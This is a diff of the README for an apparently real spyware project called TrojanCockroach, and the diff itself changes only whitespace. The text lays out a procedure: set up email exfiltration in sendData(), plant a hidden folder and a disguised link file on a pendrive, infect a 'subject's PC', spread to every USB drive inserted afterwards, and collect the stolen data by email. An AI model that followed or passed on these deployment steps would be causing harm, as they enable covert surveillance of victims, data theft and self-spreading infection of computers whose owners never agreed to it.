@@ -13,7 +13,7 @@
 
 ### Setup
 1. Preparation 
-
+  
   1. Download the full package from [here](https://minhaskamal.github.io/DownGit/#/home?url=https://github.com/MinhasKamal/TrojanCockroach/tree/master/com/minhaskamal/trojanCockroach).
   
   2. Change the method **sendData()** of TrojanCockroach.cpp- place your email and password in the command.
@@ -24,19 +24,19 @@
   4. Place **TrojanCockroach.exe**, **Infect.exe**, **Transmit.exe**, **Infect.lnk** & **TrojanCockroach.lnk** in the same folder. This is how they look-
   
    ![Trojan Cockroach full package](https://cloud.githubusercontent.com/assets/5456665/21505256/c5c4a982-cc8f-11e6-9b12-147fa7630e0f.png)
-   
+
   5. Now run **TrojanCockroach.exe** then insert a pendrive (see the magic!). You will get a hidden folder and link file in your pendrive. The hidden folder contains the full package, & the link file is actually renamed form of Infect.lnk.
   
    ![Trojan Cockroach infected pendrive](https://cloud.githubusercontent.com/assets/5456665/21505254/c5c0394c-cc8f-11e6-99be-16175b741c2a.PNG)
     
 2. Attack 
-
+  
   1. Insert the USB-Drive in the subject's PC (Yes, you have to start the spreading process from somewhere!). Run Infect.lnk and the spyware will be injected.
   
   2. The syware will be activated after a reboot. Now (after a restart) every time any USB-Drive is inserted in the affected PC, the virus will copy itself in that, and the cycle will start again.
 
 3. Data Collection 
-
+  
   1. You need to wait several days (depending on the number of power on/off of the PC), before getting any data.
   
   2. After getting the email copy the full message to a text file.
